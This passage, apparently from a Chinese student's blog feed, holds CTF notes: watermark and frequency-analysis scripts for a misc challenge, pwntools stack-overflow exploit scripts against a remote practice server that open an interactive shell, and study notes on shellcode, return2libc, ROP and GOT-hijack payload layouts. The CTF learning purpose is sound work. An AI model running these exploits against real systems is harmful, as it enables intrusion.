class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">from blind_watermark import WaterMark</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"># 加水印</span><br><span class="line">bwm1 = WaterMark(password_wm=1, password_img=1)</span><br><span class="line"># 读取原图</span><br><span class="line">bwm1.read_img(&#x27;C:/Users/brighten/Desktop/output/png/00000000.png&#x27;)</span><br><span class="line"># 读取水印</span><br><span class="line">bwm1.read_wm(&#x27;C:/Users/brighten/Desktop/output/png/00000232.png&#x27;)</span><br><span class="line"># 打上盲水印</span><br><span class="line">bwm1.embed(&#x27;output/打上水印的图.png&#x27;)&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">bwm1 = WaterMark(password_wm=1, password_img=1)</span><br><span class="line"># 注意需要设定水印的长宽wm_shape</span><br><span class="line">bwm1.extract(filename=&#x27;C:/Users/brighten/Desktop/output/png/00000000.png&#x27;, wm_shape=(626, 626), out_wm_name=&#x27;C:/Users/brighten/Desktop/output/png/00000232.png&#x27;, )</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>出事了，解不出来。</p><p>在艰难的斗争之后，我发现了盲点。<br> 命令如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python bwmforpy3.py decode 00000000.png 00000232.png 1.png --oldseed</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>这个作者就是神</strong><br> <strong>python 3.6 盲水印脚本安装说明</strong></p><blockquote></blockquote><p><a href="https://blog.csdn.net/qq_50898079/article/details/112060543">https://blog.csdn.net/qq_50898079&#x2F;article&#x2F;details&#x2F;112060543</a></p><p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210513171129761.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"><br> 依稀可以看出来这个是</p><h2 id="in-11-txt"><a href="#in-11-txt" class="headerlink" title="in 11.txt"></a>in 11.txt</h2><p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210513171217939.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"><br> 这个哈利波特文章还挺长的。</p><p>明显就是字频分析，可能还得先做一个替换在来字频分析。<br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210513171329207.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">a = dIW</span><br><span class="line">b = sSD</span><br><span class="line">c = adE </span><br><span class="line">d = jVf</span><br><span class="line">e = QW8</span><br><span class="line">f = SA=</span><br><span class="line">g = jBt</span><br><span class="line">h = 5RE</span><br><span class="line">i = tRQ</span><br><span class="line">j = SPA</span><br><span class="line">k = 8DS</span><br><span class="line">l = XiE</span><br><span class="line">m = S8S</span><br><span class="line">n = MkF</span><br><span class="line">o = T9p</span><br><span class="line">p = PS5</span><br><span class="line">q = E/S</span><br><span class="line">r = -sd</span><br><span class="line">s = SQW</span><br><span class="line">t = obW</span><br><span class="line">u = /WS</span><br><span class="line">v = SD9</span><br><span class="line">w = cw=</span><br><span class="line">x = ASD</span><br><span class="line">y = FTa</span><br><span class="line">z = AE7</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote></blockquote><p>大概有40万个字，要是先替换再字频分析，替换完成之后大概翻3倍。 这个字频分析的脚本无论是抄还是写都不是很难的事情。</p><p>记得以前抄过一个代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python </span><br><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line">alphabet = &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^&amp;amp;*()_+- =&#123;&#125;[]&quot;</span><br><span class="line">f = open(&quot;C://Users//brighten//Desktop//flag.doc&quot;, &quot;r&quot;)</span><br><span class="line">data = f.read()  # 读文件</span><br><span class="line">result = &#123;d: 0 for d in alphabet&#125;  # alphabet:0 的字典</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># print(&quot;result:&quot;+str(result))</span><br><span class="line"></span><br><span class="line">def sort_by_value(d):  # 排序函数</span><br><span class="line">    items = d.items()</span><br><span class="line">    backitems = [[v[1], v[0]] for v in items]</span><br><span class="line">    backitems.sort(reverse=True)</span><br><span class="line">    return [backitems[i][1] for i in range(0, len(backitems))]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for d in data:</span><br><span class="line">    for alpha in alphabet:</span><br><span class="line">        if d == alpha:</span><br><span class="line">            result[alpha] = result[alpha] + 1  # 循环，历遍所有字符，计算count放到result中</span><br><span class="line"></span><br><span class="line">print(&quot;items:&quot;)</span><br><span class="line">print(result.items())  # 所有字符的出现次数</span><br><span class="line">print(sort_by_value(result))</span><br><span class="line"></span><br><span class="line">b = sort_by_value(result)</span><br><span class="line"></span><br><span class="line">b = [str(i) for i in b]</span><br><span class="line">str2 = &#x27;&#x27;.join(b)</span><br><span class="line">print(str2)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote></blockquote><p>Python 3.7.0 (default, Jun 28 2018, 08:04:48) [MSC v.1912 64 bit (AMD64)]<br> Type ‘copyright’, ‘credits’ or ‘license’ for more information<br> IPython 6.5.0 – An enhanced Interactive Python. Type ‘?’ for help.<br> PyDev console: using IPython 6.5.0<br> Python 3.7.0 (default, Jun 28 2018, 08:04:48) [MSC v.1912 64 bit (AMD64)] on win32<br> In[2]: runfile(‘C:&#x2F;Users&#x2F;brighten&#x2F;Desktop&#x2F;信息安全工具快捷&#x2F;misc&#x2F;字频分析.py’, wdir&#x3D;‘C:&#x2F;Users&#x2F;brighten&#x2F;Desktop&#x2F;信息安全工具快捷&#x2F;misc’)<br> items:<br> dict_items([(‘a’, 25887), (‘b’, 4980), (‘c’, 6403), (‘d’, 15932), (‘e’, 39628), (‘f’, 6431), (‘g’, 8127), (‘h’, 19535), (‘i’, 19422), (‘j’, 319), (‘k’, 3930), (‘l’, 14385), (‘m’, 6729), (‘n’, 21337), (‘o’, 25809), (‘p’, 4909), (‘q’, 217), (‘r’, 20990), (‘s’, 18870), (‘t’, 27993), (‘u’, 9562), (‘v’, 2716), (‘w’, 7744), (‘x’, 381), (‘y’, 8293), (‘z’, 259), (‘A’, 703), (‘B’, 348), (‘C’, 293), (‘D’, 685), (‘E’, 287), (‘F’, 426), (‘G’, 492), (‘H’, 2996), (‘I’, 1393), (‘J’, 51), (‘K’, 79), (‘L’, 209), (‘M’, 665), (‘N’, 488), (‘O’, 332), (‘P’, 639), (‘Q’, 203), (‘R’, 660), (‘S’, 844), (‘T’, 1055), (‘U’, 193), (‘V’, 192), (‘W’, 653), (‘X’, 2), (‘Y’, 326), (‘Z’, 5), (‘1’, 11), (‘2’, 3), (‘3’, 8), (‘4’, 6), (‘5’, 2), (‘6’, 1), (‘7’, 4), (‘8’, 1), (‘9’, 4), (‘0’, 5), (’!’, 474), (’@’, 0), (’#’, 0), (’KaTeX parse error: Double superscript at position 171: … (‘]’, 0)]) [‘ ‘̲, ‘e’, ‘t’, ‘a’…’, ‘#’]<br> etaonrhisdluygwmfcbpkHv-ITSADMRWPGN!FxBOYjCEzqLQUVKJ)(134Z0972X5*86}{_^][@&#x3D;+&amp;%$#</p><p>[’ ‘, ‘e’, ‘t’, ‘a’, ‘o’, ‘n’, ‘r’, ‘h’, ‘i’, ‘s’, ‘d’, ‘l’, ‘u’, ‘y’, ‘g’, ‘w’, ‘m’, ‘f’, ‘c’, ‘b’, ‘p’, ‘k’, ‘H’, ‘v’, ‘-’, ‘I’, ‘T’, ‘S’, ‘A’, ‘D’, ‘M’, ‘R’, ‘W’, ‘P’, ‘G’, ‘N’, ‘!’, ‘F’, ‘x’, ‘B’, ‘O’, ‘Y’, ‘j’, ‘C’, ‘E’, ‘z’, ‘q’, ‘L’, ‘Q’, ‘U’, ‘V’, ‘K’, ‘J’, ‘)’, ‘(’, ‘1’, ‘3’, ‘4’, ‘Z’, ‘0’, ‘9’, ‘7’, ‘2’, ‘X’, ‘5’, ‘*’, ‘8’, ‘6’, ‘}’, ‘{’, ‘_’, ‘^’, ‘]’, ‘[’, ‘@’, ‘&#x3D;’, ‘+’, ‘&amp;’, ‘%’, ‘$’, ‘#’]</p><blockquote></blockquote><p>排序为<br>etaonrhisdluygwmfcbpkHv-ITSADMRWPGN!FxBOYjCEzqLQUVKJ)(134Z0972X5*86}{_^][@&#x3D;+&amp;%$#</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">a = dIW</span><br><span class="line">b = sSD</span><br><span class="line">c = adE </span><br><span class="line">d = jVf</span><br><span class="line">e = QW8</span><br><span class="line">f = SA=</span><br><span class="line">g = jBt</span><br><span class="line">h = 5RE</span><br><span class="line">i = tRQ</span><br><span class="line">j = SPA</span><br><span class="line">k = 8DS</span><br><span class="line">l = XiE</span><br><span class="line">m = S8S</span><br><span class="line">n = MkF</span><br><span class="line">o = T9p</span><br><span class="line">p = PS5</span><br><span class="line">q = E/S</span><br><span class="line">r = -sd</span><br><span class="line">s = SQW</span><br><span class="line">t = obW</span><br><span class="line">u = /WS</span><br><span class="line">v = SD9</span><br><span class="line">w = cw=</span><br><span class="line">x = ASD</span><br><span class="line">y = FTa</span><br><span class="line">z = AE7</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote></blockquote><p>etaonrhisdluygwmf</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python </span><br><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">将下面的这些放入txt文件points.txt</span><br><span class="line">a = dIW</span><br><span class="line">b = sSD</span><br><span class="line">c = adE</span><br><span class="line">d = jVf</span><br><span class="line">e = QW8</span><br><span class="line">f = SA=</span><br><span class="line">g = jBt</span><br><span class="line">h = 5RE</span><br><span class="line">i = tRQ</span><br><span class="line">j = SPA</span><br><span class="line">k = 8DS</span><br><span class="line">l = XiE</span><br><span class="line">m = S8S</span><br><span class="line">n = MkF</span><br><span class="line">o = T9p</span><br><span class="line">p = PS5</span><br><span class="line">q = E/S</span><br><span class="line">r = -sd</span><br><span class="line">s = SQW</span><br><span class="line">t = obW</span><br><span class="line">u = /WS</span><br><span class="line">v = SD9</span><br><span class="line">w = cw=</span><br><span class="line">x = ASD</span><br><span class="line">y = FTa</span><br><span class="line">z = AE7</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">z = &#123;&#125;</span><br><span class="line">with  open(&quot;./points.txt&quot;) as f:</span><br><span class="line">    for i in f:</span><br><span class="line">        # print(i)</span><br><span class="line">        test = i[0]</span><br><span class="line">        dd = i[4:7]</span><br><span class="line">        &#x27;&#x27;&#x27;print(test)</span><br><span class="line">        print(dd)&#x27;&#x27;&#x27;</span><br><span class="line">        z[test] = dd</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">ff = &#123;&#x27;a&#x27;: &#x27;dIW&#x27;, &#x27;b&#x27;: &#x27;sSD&#x27;, &#x27;c&#x27;: &#x27;adE&#x27;, &#x27;d&#x27;: &#x27;jVf&#x27;, &#x27;e&#x27;: &#x27;QW8&#x27;, &#x27;f&#x27;: &#x27;SA=&#x27;, &#x27;g&#x27;: &#x27;jBt&#x27;, &#x27;h&#x27;: &#x27;5RE&#x27;, &#x27;i&#x27;: &#x27;tRQ&#x27;,</span><br><span class="line">      &#x27;j&#x27;: &#x27;SPA&#x27;, &#x27;k&#x27;: &#x27;8DS&#x27;, &#x27;l&#x27;: &#x27;XiE&#x27;, &#x27;m&#x27;: &#x27;S8S&#x27;, &#x27;n&#x27;: &#x27;MkF&#x27;, &#x27;o&#x27;: &#x27;T9p&#x27;, &#x27;p&#x27;: &#x27;PS5&#x27;, &#x27;q&#x27;: &#x27;E/S&#x27;, &#x27;r&#x27;: &#x27;-sd&#x27;,</span><br><span class="line">      &#x27;s&#x27;: &#x27;SQW&#x27;, &#x27;t&#x27;: &#x27;obW&#x27;, &#x27;u&#x27;: &#x27;/WS&#x27;, &#x27;v&#x27;: &#x27;SD9&#x27;, &#x27;w&#x27;: &#x27;cw=&#x27;, &#x27;x&#x27;: &#x27;ASD&#x27;, &#x27;y&#x27;: &#x27;FTa&#x27;, &#x27;z&#x27;: &quot;AE7&quot;&#125;&#x27;&#x27;&#x27;</span><br><span class="line">ss = &quot;etaonrhisdluygw&quot;</span><br><span class="line"></span><br><span class="line">print(z)</span><br><span class="line">x = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def tihau(s):</span><br><span class="line">    x.append(z[s])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for i in ss:</span><br><span class="line">    tihau(i)</span><br><span class="line">print(&#x27;&#x27;.join(x))</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote></blockquote><p>In[2]: runfile(‘C:&#x2F;Users&#x2F;brighten&#x2F;Desktop&#x2F;信息安全工具快捷&#x2F;misc&#x2F;字符替换脚本.py’,<br> wdir&#x3D;‘C:&#x2F;Users&#x2F;brighten&#x2F;Desktop&#x2F;信息安全工具快捷&#x2F;misc’) {‘a’: ‘dIW’, ‘b’:<br> ‘sSD’, ‘c’: ‘adE’, ‘d’: ‘jVf’, ‘e’: ‘QW8’, ‘f’: ‘SA&#x3D;’, ‘g’: ‘jBt’,<br> ‘h’: ‘5RE’, ‘i’: ‘tRQ’, ‘j’: ‘SPA’, ‘k’: ‘8DS’, ‘l’: ‘XiE’, ‘m’:<br> ‘S8S’, ‘n’: ‘MkF’, ‘o’: ‘T9p’, ‘p’: ‘PS5’, ‘q’: ‘E&#x2F;S’, ‘r’: ‘-sd’,<br> ‘s’: ‘SQW’, ‘t’: ‘obW’, ‘u’: ‘&#x2F;WS’, ‘v’: ‘SD9’, ‘w’: ‘cw&#x3D;’, ‘x’:<br> ‘ASD’, ‘y’: ‘FTa’, ‘z’: ‘AE7’}<br> QW8obWdIWT9pMkF-sd5REtRQSQWjVfXiE&#x2F;WSFTajBtcw&#x3D;</p><h2 id="QW8obWdIWT9pMkF-sd5REtRQSQWjVfXiE-x2F-WSFTajBtcw-x3D"><a href="#QW8obWdIWT9pMkF-sd5REtRQSQWjVfXiE-x2F-WSFTajBtcw-x3D" class="headerlink" title="QW8obWdIWT9pMkF-sd5REtRQSQWjVfXiE&#x2F;WSFTajBtcw&#x3D;"></a>QW8obWdIWT9pMkF-sd5REtRQSQWjVfXiE&#x2F;WSFTajBtcw&#x3D;</h2><p>这个明显就是base系列的，看别人的题解，说是这个编码有问题。</p><p>再做下去没有意义了。本题就到这里结束。</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 本科生 </tag>
            
            <tag> 竞赛，ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kali linux</title>
      <link href="/2020/05/27/%E5%8E%9F%E5%88%9B--%20%20kali%20linux/"/>
      <url>/2020/05/27/%E5%8E%9F%E5%88%9B--%20%20kali%20linux/</url>
      
        <content type="html"><![CDATA[<h1 id="原创"><a href="#原创" class="headerlink" title="原创"></a>原创</h1><p>：  kali linux</p><h1 id="kali-linux"><a href="#kali-linux" class="headerlink" title="kali linux"></a>kali linux</h1><p>在本日已经是第3次安装kali linux</p><p>但这次再也没有装好。</p><p>决心安装vmx格式，远离iso文件。</p><p>配置前要备份虚拟机，虚拟机出问题谁也拦不住。</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 本科生，ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn(2) 愚人发现了pwn的有趣之处  对于填充大小的研究</title>
      <link href="/2020/05/27/%E5%8E%9F%E5%88%9B--%20%20pwn(2)%20%E6%84%9A%E4%BA%BA%E5%8F%91%E7%8E%B0%E4%BA%86pwn%E7%9A%84%E6%9C%89%E8%B6%A3%E4%B9%8B%E5%A4%84%20%20%E5%AF%B9%E4%BA%8E%E5%A1%AB%E5%85%85%E5%A4%A7%E5%B0%8F%E7%9A%84%E7%A0%94%E7%A9%B6/"/>
      <url>/2020/05/27/%E5%8E%9F%E5%88%9B--%20%20pwn(2)%20%E6%84%9A%E4%BA%BA%E5%8F%91%E7%8E%B0%E4%BA%86pwn%E7%9A%84%E6%9C%89%E8%B6%A3%E4%B9%8B%E5%A4%84%20%20%E5%AF%B9%E4%BA%8E%E5%A1%AB%E5%85%85%E5%A4%A7%E5%B0%8F%E7%9A%84%E7%A0%94%E7%A9%B6/</url>
      
        <content type="html"><![CDATA[<h1 id="原创"><a href="#原创" class="headerlink" title="原创"></a>原创</h1><p>：  pwn(2) 愚人发现了pwn的有趣之处  对于填充大小的研究</p><h1 id="pwn-2-愚人发现了pwn的有趣之处-对于填充大小的研究"><a href="#pwn-2-愚人发现了pwn的有趣之处-对于填充大小的研究" class="headerlink" title="pwn(2) 愚人发现了pwn的有趣之处  对于填充大小的研究"></a>pwn(2) 愚人发现了pwn的有趣之处  对于填充大小的研究</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#python3 </span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = remote(&#x27;node3.buuoj.cn&#x27;, &#x27;25822&#x27;)</span><br><span class="line">payload = b&#x27;b&#x27; * (0x40+8)+ p64(0x40060D)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()    </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>抄了几个wp，一直很奇怪为什么这个填充的字符数量为什么规则不一样。</p><p>比如上面的填充规则是输入的字符大小+EBP大小</p><p>因为是64位的系统所以EBP大小是8，而前面的0x40是64位，也就是此处输入的字符大小。</p><p>后面的<strong>0x40060D</strong>是栈帧头，再push ebp就是system(**)命令了。</p><p>需要的就是再+ebp的大小，以达到eip,eip里面放的是system(**)的地址。<br> 这样合理性就很 充分了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#python3 </span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p=remote(&#x27;xxxxxxxxxx&#x27;,xxxxx)</span><br><span class="line"></span><br><span class="line">payload=&#x27;I&#x27;*(0x30-0x04)+p32(0b01000001001101001000000000000000)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#x27;Let\&#x27;s guess the number.&#x27;)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>而此处目的是修改<br> 覆盖的是var_4<br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210509141820479.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"><br> 在内存中，这些变量是线性存放的，就如下图所示。<br> 我们的输入就是var_30。目的是填充到var_4的位置。<br> 做一个溢出吧。<br> 这些数据的基准是rbp，rbp是什么？好像没有这个寄存器吧。这个东西好像是交寄存器指针什么的。<br> 反正是知道了他们两个变量的相对地址了。<br> <strong>相对地址就是0x30-0x04</strong></p><p><strong><code>payload=&#39;I&#39;*(0x30-0x04)+p32(0b01000001001101001000000000000000)</code></strong></p><p>构造payload 。<br> 就是把相差的地址填满。之后加一个<strong>p32(0b01000001001101001000000000000000)</strong></p><p>0b01000001001101001000000000000000<br> 这个就是某个小数的16进制表示。<br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210509142610181.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"><br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210509141654422.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"></p><blockquote></blockquote><p>p64(),p32()函数 主要是对整数进行打包：p32、p64是打包为二进制</p><p>原因在于要覆盖的东西不一样。</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 本科生 </tag>
            
            <tag> 竞赛，ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn学习记录笔记</title>
      <link href="/2020/05/27/%E5%8E%9F%E5%88%9B--%20%20pwn%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95%E7%AC%94%E8%AE%B0/"/>
      <url>/2020/05/27/%E5%8E%9F%E5%88%9B--%20%20pwn%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="原创"><a href="#原创" class="headerlink" title="原创"></a>原创</h1><p>：  pwn学习记录笔记</p><h1 id="pwn学习记录笔记"><a href="#pwn学习记录笔记" class="headerlink" title="pwn学习记录笔记"></a>pwn学习记录笔记</h1><p><a href="https://zhuanlan.zhihu.com/p/25816426">转自知乎大神 —— 手把手教你栈溢出从入门到放弃</a></p><h2 id="基础4方法"><a href="#基础4方法" class="headerlink" title="基础4方法"></a>基础4方法</h2><blockquote></blockquote><p>修改返回地址，让其指向溢出数据中的一段指令（shellcode）<br> 修改返回地址，让其指向内存中已有的某个函数（return2libc）<br> 修改返回地址，让其指向内存中已有的一段指令（ROP）<br> 修改某个被调用函数的地址，让其指向另一个函数（hijack GOT）</p><h2 id="修改返回地址，让其指向溢出数据中的一段指令（shellcode）"><a href="#修改返回地址，让其指向溢出数据中的一段指令（shellcode）" class="headerlink" title="修改返回地址，让其指向溢出数据中的一段指令（shellcode）"></a>修改返回地址，让其指向溢出数据中的一段指令（shellcode）</h2><p>payload : padding1 + address of shellcode + padding2 + shellcode<br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210502171303173.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"><br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210502171321582.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70">会有一些权限的问题</p><blockquote></blockquote><p>而下面的两种方法就可以解决权限的问题<br> 就是</p><p>修改返回地址，让其指向内存中已有的某个函数（return2libc）</p><blockquote></blockquote><p>修改返回地址，让其指向内存中已有的一段指令（ROP）</p><h2 id="Return2libc"><a href="#Return2libc" class="headerlink" title="Return2libc"></a>Return2libc</h2><p>修改返回地址，让其指向内存中已有的某个函数<br> 重点是找到系统级指令<br> payload: padding1 + address of system() + padding2 + address of “&#x2F;bin&#x2F;sh”</p><p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210502172118378.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"><br> 一些系统级的函数（例如 system() 等）</p><p>调用 system() 函数打开 shell 的完整形式为 system(“&#x2F;bin&#x2F;sh”)</p><h2 id="ROP-Return-Oriented-Programming"><a href="#ROP-Return-Oriented-Programming" class="headerlink" title="ROP ( Return Oriented Programming )"></a>ROP ( Return Oriented Programming )</h2><p>目标函数在内存内无法找到，有时目标操作并没有特定的函数可以完美适配。这时就需要在内存中寻找多个指令片段，拼凑出一系列操作来达成目的。</p><blockquote></blockquote><p>payload : padding + address of gadget<br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210502184908520.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"></p><blockquote></blockquote><p>payload : padding + address of gadget 1 + address of gadget 2 + …<br> address of gadget n<br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/2021050218503446.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"></p><h2 id="Hijack-GOT"><a href="#Hijack-GOT" class="headerlink" title="Hijack GOT"></a>Hijack GOT</h2><p>－－修改某个被调用函数的地址，让其指向另一个函数</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 本科生 </tag>
            
            <tag> 竞赛，ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>word的奇葩功能--隐藏文字</title>
